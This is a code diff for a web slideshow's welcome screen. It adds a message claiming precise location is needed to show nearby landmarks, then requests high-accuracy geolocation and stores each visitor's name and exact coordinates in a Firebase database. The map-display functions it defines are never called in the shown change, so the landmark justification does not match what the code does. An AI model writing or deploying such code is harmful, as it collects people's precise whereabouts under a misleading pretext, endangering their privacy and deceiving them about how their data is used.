@@ -11,6 +11,7 @@ function showWelcomeScreen() {
         <div class="welcome-content">
             <h2>Welcome to the Slideshow</h2>
             <input type="text" id="nameInput" placeholder="Enter your name" />
+            <p>To provide the best experience, we need access to your precise location. This will help us show nearby landmarks.</p>
             <button id="enterBtn">Enter</button>
         </div>
     `;
@@ -33,16 +34,101 @@ function showWelcomeScreen() {
     
     // Modify the enter button click handler in showWelcomeScreen
     const enterBtn = document.getElementById('enterBtn');
-    enterBtn.addEventListener('click', () => {
+    enterBtn.addEventListener('click', async () => {
         viewerName = document.getElementById('nameInput').value.trim();
         if (viewerName) {
-            // Save name to Firebase
-            database.ref('visitors').push({
-                name: viewerName,
-                timestamp: firebase.database.ServerValue.TIMESTAMP
-            });
-            document.body.removeChild(welcomeDiv);
+            try {
+                const position = await getPreciseLocation();
+                const { latitude, longitude, accuracy } = position.coords;
+                
+                console.log('Exact Location:', {
+                    latitude: latitude.toFixed(6),
+                    longitude: longitude.toFixed(6),
+                    accuracy: `${accuracy} meters`
+                });
+
+                // Save data to Firebase
+                const visitorRef = database.ref('visitors').push();
+                visitorRef.set({
+                    name: viewerName,
+                    location: { 
+                        latitude: latitude.toFixed(6),
+                        longitude: longitude.toFixed(6),
+                        accuracy: accuracy
+                    },
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+
+                document.body.removeChild(welcomeDiv);
+            } catch (error) {
+                console.error('Error getting location:', error);
+                // Handle case where user denies permission
+                const visitorRef = database.ref('visitors').push();
+                visitorRef.set({
+                    name: viewerName,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+                document.body.removeChild(welcomeDiv);
+            }
         }
+    });
+}
+
+function showLeafletMap(latitude, longitude) {
+    const mapDiv = document.createElement('div');
+    mapDiv.id = 'map';
+    mapDiv.style.height = '400px';
+    mapDiv.style.margin = '20px 0';
+    document.body.appendChild(mapDiv);
+
+    // Initialize Leaflet map
+    const map = L.map('map').setView([latitude, longitude], 15);
+
+    // Add OpenStreetMap tiles
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+    }).addTo(map);
+
+    // Add marker
+    L.marker([latitude, longitude]).addTo(map)
+        .bindPopup('Your Location')
+        .openPopup();
+}
+
+function getPreciseLocation() {
+    return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+            const options = {
+                enableHighAccuracy: true,  // Request high accuracy
+                timeout: 5000,            // Maximum wait time
+                maximumAge: 0             // Don't use cached position
+            };
+            
+            navigator.geolocation.getCurrentPosition(resolve, reject, options);
+        } else {
+            reject(new Error('Geolocation is not supported by this browser.'));
+        }
+    });
+}
+
+function showMap(latitude, longitude) {
+    const mapDiv = document.createElement('div');
+    mapDiv.id = 'map';
+    mapDiv.style.height = '400px';
+    mapDiv.style.margin = '20px 0';
+    document.body.appendChild(mapDiv);
+
+    // Initialize Google Maps
+    const map = new google.maps.Map(mapDiv, {
+        center: { lat: latitude, lng: longitude },
+        zoom: 15
+    });
+
+    // Add marker
+    new google.maps.Marker({
+        position: { lat: latitude, lng: longitude },
+        map: map,
+        title: 'Your Location'
     });
 }
 
